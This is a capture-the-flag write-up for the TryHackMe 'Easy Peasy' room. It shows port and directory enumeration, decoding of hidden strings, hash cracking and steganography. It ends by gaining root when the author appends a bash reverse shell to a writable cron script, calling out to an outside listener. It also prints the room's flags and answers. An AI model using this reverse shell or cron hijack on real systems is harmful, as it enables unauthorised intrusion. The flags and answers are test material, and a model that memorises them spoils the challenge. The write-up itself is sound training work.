# Easy Peasy

Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

[Easy Peasy](https://tryhackme.com/room/easypeasyctf)

## Topic's

- Network Enumeration
- Web Enumeration
- Cryptography
  - Base64
  - Base62
  - Binary
- Web Poking
- Brute Forcing (Hash)
- Stegangraphy
- Exploiting Crontab

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Enumeration through Nmap

Deploy the machine attached to this task and use nmap to enumerate it.

1. How many ports are open?

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ sudo nmap -sC -sV -sS -Pn -p- 10.10.152.0
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 11:42 CEST
Nmap scan report for 10.10.152.0
Host is up (0.033s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.25 seconds
```

`3`

2. What is the version of nginx?

`1.16.1`

3. What is running on the highest port?

`65524`

## Compromising the machine

Now you've enumerated the machine, answer questions and compromise it!

1. Using GoBuster, find flag 1.

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ gobuster dir -u http://10.10.152.0/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.152.0/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/05 11:44:02 Starting gobuster
===============================================================
/hidden (Status: 301)
Progress: 119963 / 220561 (54.39%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/05 11:51:16 Finished
===============================================================

kali@kali:~/CTFs/tryhackme/Easy Peasy$ gobuster dir -u http://10.10.152.0/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.152.0/hidden
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/05 11:52:41 Starting gobuster
===============================================================
/whatever (Status: 301)
Progress: 75300 / 220561 (34.14%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/05 11:57:05 Finished
===============================================================
```

- [view-source:http://10.10.152.0/hidden/whatever/](view-source:http://10.10.152.0/hidden/whatever/)

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
flag{f1rs7_fl4g}
```

`flag{f1rs7_fl4g}`

1. Further enumerate the machine, what is flag 2?

- [http://10.10.152.0:65524/robots.txt](http://10.10.152.0:65524/robots.txt)

`a18672860d0510e5ab6699730763b250`

`flag{1m_s3c0nd_fl4g}`

2. Crack the hash with easypeasy.txt, What is the flag 3?

- [http://10.10.152.0:65524/](http://10.10.152.0:65524/)

![](2020-10-05_12-05.png)

`flag{9fdafbd64c47471a8f54cd3fc64cd312}`

3. What is the hidden directory?

- [view-source:http://10.10.152.0:65524/](view-source:http://10.10.152.0:65524/)

```html
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

- [Base62 Decode Online Tool](https://www.better-converter.com/Encoders-Decoders/Base62-Decode)

`/n0th1ng3ls3m4tt3r`

1. Using the wordlist that provided to you in this task crack the hash what is the password?

- [http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/](http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/)

![2020-10-05_12-10.png](2020-10-05_12-10.png)

`940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ john --wordlist=easypeasy.txt --format=gost matrix.hash
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)
1g 0:00:00:00 DONE (2020-10-05 12:14) 20.00g/s 81920p/s 81920c/s 81920C/s mypasswordforthatjob..flash88
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`mypasswordforthatjob`

1. What is the password to login to the machine via SSH?

- [http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg](http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg)

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ steghide extract -sf binarycodepixabay.jpg
Enter passphrase:
wrote extracted data to "secrettext.txt".
kali@kali:~/CTFs/tryhackme/Easy Peasy$ cat secrettext.txt
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

- [https://www.rapidtables.com/convert/number/binary-to-ascii.html](https://www.rapidtables.com/convert/number/binary-to-ascii.html)

`iconvertedmypasswordtobinary`

2. What is the user flag?

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ ssh boring@10.10.152.0 -p 6498
The authenticity of host '[10.10.152.0]:6498 ([10.10.152.0]:6498)' can't be established.
ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.152.0]:6498' (ECDSA) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.152.0's password:
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$
```

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ echo "synt{a0jvgf33zfa0ez4y}" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
flag{n0wits33msn0rm4l}
```

`flag{n0wits33msn0rm4l}`

3. What is the root flag?

```
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

boring@kral4-PC:~$ cd /var/www/
```

```
kali@kali:~/CTFs/tryhackme/Easy Peasy$ nc -nlvp 9001
```

```
boring@kral4-PC:/var/www$ echo "bash -i >& /dev/tcp/10.8.106.222/9001 0>&1" >> .mysecretcronjob.sh
```

```
root@kral4-PC:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Jun 15 12:40 .
drwxr-xr-x 23 root root 4096 Jun 15 01:08 ..
-rw-------  1 root root    2 Oct  5 03:45 .bash_history
-rw-r--r--  1 root root 3136 Jun 15 12:40 .bashrc
drwx------  2 root root 4096 Jun 13 15:40 .cache
drwx------  3 root root 4096 Jun 13 15:40 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13 15:44 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15 01:01 .root.txt
-rw-r--r--  1 root root   66 Jun 14 21:48 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
root@kral4-PC:~#
```
